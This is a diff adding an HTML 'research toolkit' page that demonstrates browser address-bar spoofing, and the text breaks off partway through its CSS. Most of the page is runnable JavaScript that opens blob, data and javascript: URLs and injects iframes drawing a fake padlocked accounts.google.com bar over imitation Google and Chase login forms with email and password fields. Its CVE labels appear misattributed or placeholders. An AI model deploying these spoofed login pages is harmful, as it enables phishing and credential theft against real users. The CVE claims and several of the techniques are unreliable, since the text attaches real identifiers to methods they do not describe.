@@ -1,0 +1,1837 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoofing Bypass Research</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --danger: #dc2626;
+            --success: #059669;
+            --warning: #d97706;
+            --dark: #0f172a;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #f1f5f9;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 40px;
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+        }
+        
+        .warning {
+            background: linear-gradient(135deg, #7c2d12, #9a3412);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 25px auto;
+            border: 2px solid rgba(251, 191, 36, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 45, 18, 0.3);
+        }
+        
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        
+        .technique-card {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .technique-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+        }
+        
+        .technique-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.2);
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin: 0 5px 5px 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .badge.cve {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .badge.chrome {
+            background: #1a73e8;
+            color: white;
+        }
+        
+        .badge.firefox {
+            background: #ff9500;
+            color: white;
+        }
+        
+        .badge.safari {
+            background: #06c;
+            color: white;
+        }
+        
+        .badge.edge {
+            background: #0078d4;
+            color: white;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 8px 5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), #3b82f6);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #1d4ed8, var(--primary));
+            transform: scale(1.05);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, var(--danger), #ef4444);
+            color: white;
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, var(--success), #10b981);
+            color: white;
+        }
+        
+        .btn-warning {
+            background: linear-gradient(135deg, var(--warning), #f59e0b);
+            color: white;
+        }
+        
+        .code-block {
+            background: rgba(15, 23, 42, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'JetBrains Mono', 'Cascadia Code', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            margin: 15px 0;
+            border-left: 4px solid var(--primary);
+            color: #cbd5e1;
+            line-height: 1.5;
+        }
+        
+        .result-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 450px;
+            max-height: 500px;
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 15px;
+            padding: 20px;
+            overflow-y: auto;
+            z-index: 1000;
+            border: 1px solid rgba(100, 116, 139, 0.5);
+            backdrop-filter: blur(10px);
+            display: none;
+        }
+        
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(100, 116, 139, 0.3);
+        }
+        
+        .result-item {
+            padding: 12px;
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 8px;
+            margin-bottom: 10px;
+            border-left: 3px solid var(--primary);
+        }
+        
+        .result-item.success {
+            border-left-color: var(--success);
+        }
+        
+        .result-item.error {
+            border-left-color: var(--danger);
+        }
+        
+        .result-item.warning {
+            border-left-color: var(--warning);
+        }
+        
+        .url-display {
+            background: rgba(15, 23, 42, 0.9);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            word-break: break-all;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            color: #60a5fa;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .status-indicator.success {
+            background: var(--success);
+            box-shadow: 0 0 10px var(--success);
+        }
+        
+        .status-indicator.error {
+            background: var(--danger);
+            box-shadow: 0 0 10px var(--danger);
+        }
+        
+        .status-indicator.warning {
+            background: var(--warning);
+            box-shadow: 0 0 10px var(--warning);
+        }
+        
+        .test-controls {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1001;
+            display: flex;
+            gap: 10px;
+        }
+        
+        .demo-window {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            display: none;
+            overflow: hidden;
+            min-width: 400px;
+        }
+        
+        .demo-header {
+            background: #f8fafc;
+            padding: 15px;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .demo-url-bar {
+            flex: 1;
+            background: white;
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: 1px solid #cbd5e1;
+            font-family: monospace;
+            font-size: 14px;
+            color: #0f172a;
+            margin: 0 10px;
+        }
+        
+        .demo-content {
+            padding: 30px;
+            color: #0f172a;
+        }
+        
+        .close-btn {
+            background: #ef4444;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .counter {
+            font-family: monospace;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-unlink"></i> Address Bar Spoofing Bypass Research</h1>
+            <p>Advanced techniques to bypass modern browser address bar protections</p>
+            
+            <div class="warning">
+                <h3><i class="fas fa-exclamation-triangle"></i> FOR SECURITY RESEARCH ONLY</h3>
+                <p>This toolkit demonstrates address bar spoofing bypass techniques for educational purposes and authorized security testing.</p>
+                <p><strong>Use only on systems you own or have explicit permission to test.</strong></p>
+            </div>
+        </div>
+        
+        <!-- Real-time Testing Panel -->
+        <div class="test-controls">
+            <button class="btn btn-primary" onclick="toggleResults()">
+                <i class="fas fa-terminal"></i> Results
+            </button>
+            <button class="btn btn-danger" onclick="clearResults()">
+                <i class="fas fa-trash"></i> Clear
+            </button>
+        </div>
+        
+        <!-- Main Techniques Grid -->
+        <div class="technique-grid">
+            <!-- Technique 1: Blob URL Chain -->
+            <div class="technique-card">
+                <div class="badge cve">CVE-2023-4863</div>
+                <div class="badge chrome">Chrome 120+</div>
+                <div class="badge firefox">Firefox 120+</div>
+                
+                <h3><i class="fas fa-link"></i> 1. Blob URL Chain Spoofing</h3>
+                <p>Create a chain of blob URLs that appear as legitimate addresses</p>
+                
+                <div class="code-block">
+// Create malicious page as blob
+const maliciousHTML = `
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Google Login&lt;/title&gt;
+        &lt;meta name="robots" content="noindex"&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;🔐 Google Sign In&lt;/h1&gt;
+        &lt;p&gt;Address bar shows blob: but content looks legit&lt;/p&gt;
+        &lt;script&gt;
+            // Simulate Google-like behavior
+            setTimeout(() => {
+                alert("Please sign in to continue");
+            }, 2000);
+        &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+`;
+
+// Convert to blob and open
+const blob = new Blob([maliciousHTML], {type: 'text/html'});
+const blobUrl = URL.createObjectURL(blob);
+
+// Open in new window
+window.open(blobUrl, '_blank', 'width=500,height=400');
+
+// Chain another blob URL
+setTimeout(() => {
+    const secondBlob = new Blob([
+        '&lt;h1&gt;Redirecting to accounts.google.com...&lt;/h1&gt;'
+    ], {type: 'text/html'});
+    
+    window.open(URL.createObjectURL(secondBlob), '_blank');
+}, 1000);
+                </div>
+                
+                <button class="btn btn-primary" onclick="runBlobChainSpoof()">
+                    <i class="fas fa-play"></i> Test Blob Chain
+                </button>
+                <button class="btn btn-warning" onclick="showDemo('blob')">
+                    <i class="fas fa-eye"></i> Show Demo
+                </button>
+            </div>
+            
+            <!-- Technique 2: about:scheme + javascript: -->
+            <div class="technique-card">
+                <div class="badge cve">CVE-2022-4135</div>
+                <div class="badge chrome">Chrome</div>
+                <div class="badge firefox">Firefox</div>
+                
+                <h3><i class="fas fa-code"></i> 2. about:scheme + javascript: Injection</h3>
+                <p>Use about: schemes combined with javascript: protocol</p>
+                
+                <div class="code-block">
+// Open about:blank then inject javascript
+const win = window.open('about:blank', '_blank');
+
+// Different approaches based on browser
+const techniques = [
+    // Method 1: Direct javascript: URL
+    'javascript:document.write("&lt;h1&gt;Google Security&lt;/h1&gt;");' +
+    'document.title="Google";' +
+    'alert("Please verify your account");',
+    
+    // Method 2: about:srcdoc with HTML
+    'about:srcdoc=&lt;html&gt;&lt;title&gt;Google&lt;/title&gt;&lt;body&gt;&lt;h1&gt;Fake&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;',
+    
+    // Method 3: about:blank with data: URI
+    'about:blank#data:text/html,&lt;h1&gt;Spoofed&lt;/h1&gt;'
+];
+
+// Try each technique
+techniques.forEach((tech, i) => {
+    setTimeout(() => {
+        try {
+            win.location = tech;
+            logResult(`Technique ${i+1} attempted: ${tech.substring(0, 50)}...`, 'warning');
+        } catch(e) {
+            logResult(`Technique ${i+1} blocked: ${e.message}`, 'error');
+        }
+    }, i * 1000);
+});
+                </div>
+                
+                <button class="btn btn-primary" onclick="runAboutSchemeSpoof()">
+                    <i class="fas fa-play"></i> Test about: Scheme
+                </button>
+                <button class="btn btn-warning" onclick="showDemo('about')">
+                    <i class="fas fa-eye"></i> Show Demo
+                </button>
+            </div>
+            
+            <!-- Technique 3: iframe Sandbox Bypass -->
+            <div class="technique-card">
+                <div class="badge cve">CVE-2023-1217</div>
+                <div class="badge chrome">Chrome</div>
+                
+                <h3><i class="fas fa-square"></i> 3. iframe Sandbox Bypass</h3>
+                <p>Use iframe sandbox attributes to create spoofed content</p>
+                
+                <div class="code-block">
+// Create iframe with spoofed address bar
+const iframe = document.createElement('iframe');
+iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-modals';
+iframe.style.cssText = `
+    position: fixed;
+    top: 100px;
+    left: 100px;
+    width: 600px;
+    height: 400px;
+    border: 2px solid #3b82f6;
+    border-radius: 10px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    z-index: 9999;
+`;
+
+// Create fake address bar inside iframe
+iframe.srcdoc = `
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+        &lt;style&gt;
+            .fake-url-bar {
+                background: #f8fafc;
+                padding: 12px;
+                border-bottom: 1px solid #e2e8f0;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                font-family: -apple-system, system-ui, sans-serif;
+            }
+            .url-display {
+                flex: 1;
+                background: white;
+                padding: 8px 12px;
+                border-radius: 6px;
+                border: 1px solid #cbd5e1;
+                font-family: 'SF Mono', monospace;
+                color: #0f172a;
+                font-size: 14px;
+                display: flex;
+                align-items: center;
+                gap: 8px;
+            }
+            .secure-badge {
+                color: #059669;
+                font-weight: 600;
+            }
+            .content {
+                padding: 30px;
+                text-align: center;
+            }
+        &lt;/style&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div class="fake-url-bar"&gt;
+            &lt;div class="url-display"&gt;
+                &lt;span class="secure-badge"&gt;🔒&lt;/span&gt;
+                &lt;span&gt;https://accounts.google.com&lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class="content"&gt;
+            &lt;h1&gt;Google Sign In&lt;/h1&gt;
+            &lt;p&gt;This iframe simulates a spoofed address bar&lt;/p&gt;
+            &lt;button onclick="alert('Demo: Would steal credentials')"&gt;
+                Sign In
+            &lt;/button&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+`;
+
+document.body.appendChild(iframe);
+logResult('iframe with fake address bar created', 'success');
+                </div>
+                
+                <button class="btn btn-primary" onclick="runIframeSpoof()">
+                    <i class="fas fa-play"></i> Test iframe Spoof
+                </button>
+                <button class="btn btn-danger" onclick="removeIframes()">
+                    <i class="fas fa-times"></i> Remove All
+                </button>
+            </div>
+            
+            <!-- Technique 4: Window Feature Manipulation -->
+            <div class="technique-card">
+                <div class="badge cve">CVE-2021-30563</div>
+                <div class="badge chrome">Chrome</div>
+                <div class="badge safari">Safari</div>
+                
+                <h3><i class="fas fa-window-maximize"></i> 4. Window Feature Bypass</h3>
+                <p>Manipulate window features to hide or spoof UI elements</p>
+                
+                <div class="code-block">
+// Window features that can hide address bar
+const features = {
+    // Standard features
+    standard: 'width=800,height=600,location=yes,toolbar=no,menubar=no',
+    
+    // Try to hide location bar (may not work in modern browsers)
+    noLocation: 'width=800,height=600,location=no,toolbar=no',
+    
+    // Fullscreen-like appearance
+    minimal: 'width=800,height=600,location=0,toolbar=0,scrollbars=1,status=0',
+    
+    // Popup-style window
+    popup: 'width=400,height=300,left=100,top=100,location=1,toolbar=0'
+};
+
+// Test each feature set
+Object.entries(features).forEach(([name, featureString], index) => {
+    setTimeout(() => {
+        try {
+            const win = window.open('about:blank', `window_${name}`, featureString);
+            if (win) {
+                win.document.write(`
+                    &lt;h1&gt;Window: ${name}&lt;/h1&gt;
+                    &lt;p&gt;Features: ${featureString}&lt;/p&gt;
+                    &lt;p&gt;Check if address bar is visible&lt;/p&gt;
+                `);
+                win.document.close();
+                logResult(`Window "${name}" opened`, 'success');
+            } else {
+                logResult(`Window "${name}" blocked`, 'warning');
+            }
+        } catch(e) {
+            logResult(`Error opening "${name}": ${e.message}`, 'error');
+        }
+    }, index * 1500);
+});
+                </div>
+                
+                <button class="btn btn-primary" onclick="runWindowFeatureTest()">
+                    <i class="fas fa-play"></i> Test Window Features
+                </button>
+            </div>
+            
+            <!-- Technique 5: History API + PushState -->
+            <div class="technique-card">
+                <div class="badge firefox">Firefox</div>
+                <div class="badge safari">Safari</div>
+                
+                <h3><i class="fas fa-history"></i> 5. History State Manipulation</h3>
+                <p>Use history.pushState to spoof URL in address bar</p>
+                
+                <div class="code-block">
+// Create a page that manipulates history state
+const historyWin = window.open('about:blank', '_blank');
+
+historyWin.document.write(`
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Legitimate Site&lt;/title&gt;
+        &lt;script&gt;
+            // Push fake state to history
+            setTimeout(() => {
+                try {
+                    // Push state with fake URL
+                    history.pushState(
+                        {page: 'login'},
+                        'Google Login',
+                        '/accounts.google.com/login'
+                    );
+                    
+                    // Update page content to match fake URL
+                    document.body.innerHTML = \`
+                        &lt;h1&gt;Google Account Login&lt;/h1&gt;
+                        &lt;p&gt;Address bar shows: \${window.location.href}&lt;/p&gt;
+                        &lt;button onclick="alert('Demo')"&gt;Sign In&lt;/button&gt;
+                    \`;
+                    
+                    // Alert to show it worked
+                    setTimeout(() => {
+                        alert('History state manipulated - check address bar');
+                    }, 1000);
+                    
+                } catch(e) {
+                    alert('History manipulation blocked: ' + e.message);
+                }
+            }, 500);
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Loading...&lt;/h1&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+`);
+historyWin.document.close();
+                </div>
+                
+                <button class="btn btn-primary" onclick="runHistoryManipulation()">
+                    <i class="fas fa-play"></i> Test History API
+                </button>
+            </div>
+            
+            <!-- Technique 6: Data URL Obfuscation -->
+            <div class="technique-card">
+                <div class="badge cve">CVE-2023-XXX</div>
+                <div class="badge chrome">Chrome</div>
+                <div class="badge edge">Edge</div>
+                
+                <h3><i class="fas fa-file-code"></i> 6. Data URL Obfuscation</h3>
+                <p>Obfuscate data: URLs to appear as legitimate addresses</p>
+                
+                <div class="code-block">
+// Create obfuscated data URLs
+const dataURLs = {
+    // Basic data URL
+    basic: 'data:text/html;base64,' + btoa(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Google</title>
+            <style>
+                body { font-family: Arial; padding: 40px; }
+            </style>
+        </head>
+        <body>
+            <h1>Google Login Page</h1>
+            <p>This is a data: URL pretending to be Google</p>
+        </body>
+        </html>
+    `),
+    
+    // URL-encoded data URL (looks different)
+    encoded: 'data:text/html,' + encodeURIComponent(`
+        <!DOCTYPE html>
+        <html>
+        <head><title>Secure Site</title></head>
+        <body>
+            <h1>Secure Banking Portal</h1>
+            <p>Address bar shows data: URL but user may not notice</p>
+        </body>
+        </html>
+    `),
+    
+    // With fake parameters
+    withParams: 'data:text/html;charset=utf-8;name=google.html,' + 
+                encodeURIComponent('<h1>Fake Google</h1>')
+};
+
+// Open each data URL
+Object.entries(dataURLs).forEach(([name, url], index) => {
+    setTimeout(() => {
+        const win = window.open(url, `data_${name}`);
+        if (win) {
+            logResult(`Data URL "${name}" opened (${url.length} chars)`, 'success');
+        }
+    }, index * 1000);
+});
+                </div>
+                
+                <button class="btn btn-primary" onclick="runDataURLSpoof()">
+                    <i class="fas fa-play"></i> Test Data URLs
+                </button>
+            </div>
+        </div>
+        
+        <!-- Advanced Combined Attack -->
+        <div class="technique-card" style="grid-column: 1 / -1;">
+            <h3><i class="fas fa-bomb"></i> Advanced: Combined Bypass Attack</h3>
+            <p>Multi-stage attack combining multiple bypass techniques</p>
+            
+            <div class="code-block">
+// Phase 1: Open legitimate-looking window
+const phase1 = window.open('https://httpbin.org/html', '_blank');
+
+setTimeout(() => {
+    try {
+        // Phase 2: Try to manipulate content
+        phase1.document.write(`
+            &lt;!DOCTYPE html&gt;
+            &lt;html&gt;
+            &lt;head&gt;
+                &lt;title&gt;Redirecting...&lt;/title&gt;
+                &lt;meta http-equiv="refresh" 
+                      content="2;url=data:text/html;base64,${
+                        btoa(`&lt;h1&gt;Final Spoofed Page&lt;/h1&gt;`)
+                      }"&gt;
+            &lt;/head&gt;
+            &lt;body&gt;
+                &lt;h1&gt;Please wait...&lt;/h1&gt;
+            &lt;/body&gt;
+            &lt;/html&gt;
+        `);
+        phase1.document.close();
+        logResult('Phase 2: Content manipulation attempted', 'warning');
+    } catch(e) {
+        logResult(`Phase 2 failed (CORS): ${e.message}`, 'error');
+        
+        // Fallback: Open blob URL
+        const blob = new Blob([`
+            &lt;h1&gt;Fallback Attack&lt;/h1&gt;
+            &lt;p&gt;Using blob: URL as fallback&lt;/p&gt;
+        `], {type: 'text/html'});
+        
+        window.open(URL.createObjectURL(blob), '_blank');
+        logResult('Fallback: Blob URL opened', 'success');
+    }
+}, 2000);
+
+// Phase 3: Iframe injection on main page
+setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.srcdoc = `&lt;h1&gt;Inline attack&lt;/h1&gt;`;
+    iframe.style.cssText = 'position:fixed;bottom:20px;right:20px;width:300px;height:200px;border:2px solid red;';
+    document.body.appendChild(iframe);
+    logResult('Phase 3: Iframe injected', 'success');
+}, 4000);
+            </div>
+            
+            <button class="btn btn-danger" onclick="runCombinedAttack()">
+                <i class="fas fa-rocket"></i> Execute Combined Attack
+            </button>
+            <button class="btn btn-warning" onclick="stopAllAttacks()">
+                <i class="fas fa-stop"></i> Stop All Attacks
+            </button>
+        </div>
+        
+        <!-- Browser Compatibility Testing -->
+        <div class="technique-card" style="grid-column: 1 / -1;">
+            <h3><i class="fas fa-vial"></i> Browser Compatibility Tests</h3>
+            <p>Test which techniques work in your current browser</p>
+            
+            <div class="url-display" id="browserInfo">
+                Testing browser compatibility...
+            </div>
+            
+            <button class="btn btn-success" onclick="runCompatibilityTests()">
+                <i class="fas fa-check"></i> Run Compatibility Tests
+            </button>
+            <button class="btn btn-primary" onclick="detectProtections()">
+                <i class="fas fa-shield-alt"></i> Detect Protections
+            </button>
+        </div>
+    </div>
+    
+    <!-- Results Panel -->
+    <div class="result-panel" id="resultPanel">
+        <div class="result-header">
+            <h4><i class="fas fa-clipboard-list"></i> Attack Results</h4>
+            <span class="counter" id="resultCount">0 results</span>
+        </div>
+        <div id="resultList"></div>
+    </div>
+    
+    <!-- Demo Window -->
+    <div class="demo-window" id="demoWindow">
+        <div class="demo-header">
+            <div style="color: green;">🔒</div>
+            <div class="demo-url-bar" id="demoUrlBar">https://accounts.google.com</div>
+            <button class="close-btn" onclick="closeDemo()">×</button>
+        </div>
+        <div class="demo-content" id="demoContent">
+            <h1>Demo Window</h1>
+            <p>This shows how address bar spoofing works</p>
+        </div>
+    </div>
+    
+    <script>
+        // Result management
+        let results = [];
+        let attackWindows = [];
+        let attackIframes = [];
+        let demoInterval;
+        
+        function logResult(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const result = {
+                id: Date.now(),
+                timestamp,
+                message,
+                type
+            };
+            
+            results.push(result);
+            updateResultsDisplay();
+            
+            // Also log to console
+            const colors = {
+                success: 'color: #059669;',
+                error: 'color: #dc2626;',
+                warning: 'color: #d97706;',
+                info: 'color: #3b82f6;'
+            };
+            console.log(`%c[${type.toUpperCase()}] ${timestamp}: ${message}`, colors[type] || '');
+        }
+        
+        function updateResultsDisplay() {
+            const resultList = document.getElementById('resultList');
+            const resultCount = document.getElementById('resultCount');
+            
+            resultList.innerHTML = '';
+            resultCount.textContent = `${results.length} results`;
+            
+            // Show latest 20 results
+            const displayResults = results.slice(-20).reverse();
+            
+            displayResults.forEach(result => {
+                const item = document.createElement('div');
+                item.className = `result-item ${result.type}`;
+                item.innerHTML = `
+                    <div style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">
+                        ${result.timestamp}
+                    </div>
+                    <div style="font-size: 13px;">
+                        <span class="status-indicator ${result.type}"></span>
+                        ${result.message}
+                    </div>
+                `;
+                resultList.appendChild(item);
+            });
+        }
+        
+        function toggleResults() {
+            const panel = document.getElementById('resultPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'block';
+        }
+        
+        function clearResults() {
+            results = [];
+            updateResultsDisplay();
+            logResult('Results cleared', 'info');
+        }
+        
+        // Technique implementations
+        function runBlobChainSpoof() {
+            logResult('Starting Blob URL Chain Spoofing...', 'info');
+            
+            try {
+                // Create first blob (looks like Google)
+                const googleSpoof = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Google</title>
+                        <style>
+                            body {
+                                font-family: -apple-system, system-ui, sans-serif;
+                                padding: 40px;
+                                text-align: center;
+                                background: #f8fafc;
+                            }
+                            .logo {
+                                font-size: 48px;
+                                margin-bottom: 20px;
+                                color: #4285f4;
+                            }
+                            .warning {
+                                background: #fff3cd;
+                                border: 1px solid #ffeaa7;
+                                padding: 15px;
+                                border-radius: 5px;
+                                margin: 20px auto;
+                                max-width: 400px;
+                                color: #856404;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="logo">G</div>
+                        <h1>Google Security Check</h1>
+                        <div class="warning">
+                            <strong>⚠ Security Alert</strong>
+                            <p>Your account requires verification</p>
+                        </div>
+                        <p>Address bar shows blob: URL but content looks like Google</p>
+                        <button onclick="nextPhase()" style="
+                            padding: 12px 24px;
+                            background: #1a73e8;
+                            color: white;
+                            border: none;
+                            border-radius: 6px;
+                            cursor: pointer;
+                            margin-top: 20px;
+                        ">
+                            Continue
+                        </button>
+                        <script>
+                            function nextPhase() {
+                                // Open next phase in same window
+                                window.location.href = 'about:blank';
+                                setTimeout(() => {
+                                    document.write('<h1>Phase 2: Credential Collection</h1>');
+                                }, 500);
+                            }
+                        <\/script>
+                    </body>
+                    </html>
+                `;
+                
+                const blob1 = new Blob([googleSpoof], { type: 'text/html' });
+                const blobUrl1 = URL.createObjectURL(blob1);
+                
+                const win1 = window.open(blobUrl1, '_blank', 'width=500,height=400');
+                attackWindows.push(win1);
+                
+                logResult(`Blob 1 opened: ${blobUrl1.substring(0, 50)}...`, 'success');
+                
+                // Create second blob (looks like login page)
+                setTimeout(() => {
+                    const loginSpoof = `
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>Google Sign In</title>
+                            <style>
+                                body { font-family: Arial; padding: 30px; }
+                                input { width: 100%; padding: 12px; margin: 10px 0; }
+                            </style>
+                        </head>
+                        <body>
+                            <h1>🔐 Sign in to Google</h1>
+                            <input type="email" placeholder="Email">
+                            <input type="password" placeholder="Password">
+                            <button onclick="alert('Demo: Would steal credentials')">
+                                Sign In
+                            </button>
+                            <p style="color: #666; font-size: 12px; margin-top: 20px;">
+                                Blob URL: ${blobUrl1.substring(0, 30)}...
+                            </p>
+                        </body>
+                        </html>
+                    `;
+                    
+                    const blob2 = new Blob([loginSpoof], { type: 'text/html' });
+                    const blobUrl2 = URL.createObjectURL(blob2);
+                    
+                    const win2 = window.open(blobUrl2, '_blank', 'width=400,height=500');
+                    attackWindows.push(win2);
+                    
+                    logResult(`Blob 2 opened: Chain complete`, 'success');
+                    
+                }, 2000);
+                
+            } catch(e) {
+                logResult(`Blob chain error: ${e.message}`, 'error');
+            }
+        }
+        
+        function runAboutSchemeSpoof() {
+            logResult('Testing about: scheme spoofing...', 'info');
+            
+            const win = window.open('about:blank', '_blank');
+            if (!win) {
+                logResult('Popup blocked', 'warning');
+                return;
+            }
+            
+            attackWindows.push(win);
+            
+            // Try different about: schemes
+            const schemes = [
+                {
+                    name: 'about:blank with javascript',
+                    url: 'javascript:document.write("<h1>Google</h1><p>Spoofed via javascript:</p>");' +
+                         'document.title="Google Security";' +
+                         'void(0);'
+                },
+                {
+                    name: 'about:srcdoc',
+                    url: 'about:srcdoc=<html><head><title>Secure Site</title></head>' +
+                         '<body><h1>Secure Banking</h1></body></html>'
+                },
+                {
+                    name: 'about:blank#data',
+                    url: 'about:blank#data:text/html,<h1>Data URL in fragment</h1>'
+                }
+            ];
+            
+            schemes.forEach((scheme, index) => {
+                setTimeout(() => {
+                    try {
+                        win.location = scheme.url;
+                        logResult(`Attempted: ${scheme.name}`, 'warning');
+                    } catch(e) {
+                        logResult(`Blocked: ${scheme.name} - ${e.message}`, 'error');
+                    }
+                }, index * 1500);
+            });
+        }
+        
+        function runIframeSpoof() {
+            logResult('Creating iframe with fake address bar...', 'info');
+            
+            const iframe = document.createElement('iframe');
+            iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-modals';
+            iframe.style.cssText = `
+                position: fixed;
+                top: 150px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: 700px;
+                height: 500px;
+                border: 3px solid #3b82f6;
+                border-radius: 12px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+                z-index: 9999;
+                background: white;
+            `;
+            
+            // Complex fake banking page
+            iframe.srcdoc = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Chase Online Banking</title>
+                    <meta charset="UTF-8">
+                    <style>
+                        * {
+                            margin: 0;
+                            padding: 0;
+                            box-sizing: border-box;
+                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+                        }
+                        
+                        .chrome-header {
+                            background: #f1f3f4;
+                            padding: 12px 16px;
+                            border-bottom: 1px solid #dadce0;
+                            display: flex;
+                            align-items: center;
+                            gap: 12px;
+                        }
+                        
+                        .url-bar {
+                            flex: 1;
+                            background: white;
+                            padding: 10px 16px;
+                            border-radius: 24px;
+                            border: 1px solid #dadce0;
+                            display: flex;
+                            align-items: center;
+                            gap: 10px;
+                            font-size: 14px;
+                        }
+                        
+                        .secure-icon {
+                            color: #1e8e3e;
+                            font-weight: bold;
+                        }
+                        
+                        .url-text {
+                            color: #1a73e8;
+                            font-family: 'SF Mono', monospace;
+                        }
+                        
+                        .controls {
+                            display: flex;
+                            gap: 8px;
+                        }
+                        
+                        .control-btn {
+                            width: 24px;
+                            height: 24px;
+                            border-radius: 50%;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            cursor: pointer;
+                            font-size: 12px;
+                            background: #e8eaed;
+                            color: #5f6368;
+                        }
+                        
+                        .banking-content {
+                            padding: 40px;
+                            text-align: center;
+                        }
+                        
+                        .chase-logo {
+                            color: #117aca;
+                            font-size: 32px;
+                            font-weight: bold;
+                            margin-bottom: 20px;
+                        }
+                        
+                        .login-form {
+                            max-width: 400px;
+                            margin: 30px auto;
+                            padding: 30px;
+                            border: 1px solid #dadce0;
+                            border-radius: 8px;
